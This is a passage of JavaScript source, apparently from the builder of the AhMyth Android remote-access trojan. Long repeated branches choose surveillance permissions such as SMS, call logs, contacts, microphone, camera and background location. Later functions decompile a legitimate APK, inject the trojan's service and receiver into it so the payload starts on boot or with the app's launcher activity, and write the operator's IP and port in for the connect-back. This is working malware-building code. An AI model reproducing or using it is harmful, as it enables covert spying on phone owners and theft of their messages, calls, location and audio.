            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }



          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


        for (var i = 0; i < permArray.length; i++) {
            var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
            permissionName = permissionName.substring(0, permissionName.indexOf('"'));
            if (firstPart.indexOf(permissionName) == -1) {
                firstPart = firstPart + "\n" + permArray[i];
            }
        }

        return (firstPart + lastPart);

    };


    // function to use onBoot method 
    // it will bind ahmyth to orginal app 
    // and ahmyth will start once the device rebooted
    // if success then go to copy all the rest ahmyth files to orginal app
    // this method is working almost on every app 
    $appCtrl.BindOnBoot = (apkFolder) => {
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            var ahmythReciver = CONSTANTS.ahmythReciver;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + ahmythReciver + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }
                $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);

            });

        });

    };



    // function to use OnLauncher method 
    // it will bind ahmyth to orginal app 
    // and ahmyth will start once the orginal app started
    // if success then go to copy all the rest ahmyth files to orginal app
    // this method is not working on every app (unstable)
    $appCtrl.BindOnLauncher = (apkFolder) => {

        $appCtrl.Log('Finding launcher activity from AndroidManifest.xml...');
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            var launcherPath = GetLauncherPath(data, path.join(apkFolder, "smali/"));
            if (launcherPath == -1) {
                $appCtrl.Log("Cannot find the launcher activity , try the other binding method.", CONSTANTS.logStatus.FAIL);
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }


       



                $appCtrl.Log("Fetching launcher activity...");
                fs.readFile(launcherPath, 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading launcher activity Failed ', CONSTANTS.logStatus.FAIL);
                        return;
                    }


                    var startService = CONSTANTS.serviceSrc + launcherPath.substring(launcherPath.indexOf("smali/") + 6, launcherPath.indexOf(".smali")) + CONSTANTS.serviceStart;


                    var key = CONSTANTS.orgAppKey;
                    $appCtrl.Log("Modifiying launcher activity...");
                    var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                    fs.writeFile(launcherPath, output, 'utf8', (error) => {
                        if (error) {
                            $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
                            return;
                        }

                        $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);

                    });


                });
            });

        });

    }

    // fired when user click build buttom
    // collect the ip and port and start building
    $appCtrl.Build = (ip, port) => {
        if (!ip) {
            $appCtrl.Log('IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
            return;
        } else if (!port) {
            port = CONSTANTS.defaultPort;
        } else if (port > 65535 || port <= 1024) {
            $appCtrl.Log('Choose ports from range (1024,65535)', CONSTANTS.logStatus.FAIL);
            return;
        }


        // open ahmyth source file and modifiy the ip and port to the users' ones
        var ipPortFile = path.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
        $appCtrl.Log('Reading (ip:port) file from ' + CONSTANTS.apkName + '...');
        fs.readFile(ipPortFile, 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading (ip:port) file Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.Log('Adding source ip:port to ' + CONSTANTS.apkName + '...');
            $appCtrl.Log('Adding source ip:port to ' + ipPortFile + '...');
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
            fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Adding source ip:port Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);

                } else {
                    // generate a solid ahmyth apk
                    var filePath = $appCtrl.filePath;
                    if (filePath == null) {
                        $appCtrl.Log("Browse an apk file which you want to bind", CONSTANTS.logStatus.FAIL);
                        return;
                    } else if (!filePath.includes(".apk")) {
                        $appCtrl.Log("It is not an apk file", CONSTANTS.logStatus.FAIL);
                        return;
                    }


                    var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                    $appCtrl.Log('Decompiling ' + filePath + "...");
                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
                        (error, stdout, stderr) => {
                            if (error !== null) {
                                $appCtrl.Log('Decompilation Failed', CONSTANTS.logStatus.FAIL);
                                return;
                            }

                            if ($appCtrl.bindApk.method == 'BOOT')
                                $appCtrl.BindOnBoot(apkFolder);

                            else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                $appCtrl.BindOnLauncher(apkFolder);


                        });
                }
            });
        });
    }










});



//function to extract the launcher activity from the orginal app
function GetLauncherPath(manifest, smaliPath) {


    var regex = /<activity/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf('category android:name="android.intent.category.LAUNCHER"') + manifest.indexOf('category android:name="android.intent.category.INFO"');
    var indexOfActivity = -1;

    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfActivity = indices[i];
                manifest = manifest.substring(indexOfActivity, manifest.length);
                break;
            }
        }


        if (indexOfActivity != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(1, manifest.indexOf('"'))
                manifest += '.smali';
                var files = fs.walkSync(smaliPath);
                for (var i = 0; i < files.length; i++) {
                    if (files[i].substring(files[i].lastIndexOf("/") + 1) == manifest)
                        return files[i];
                }

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = path.join(smaliPath, manifest) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



}
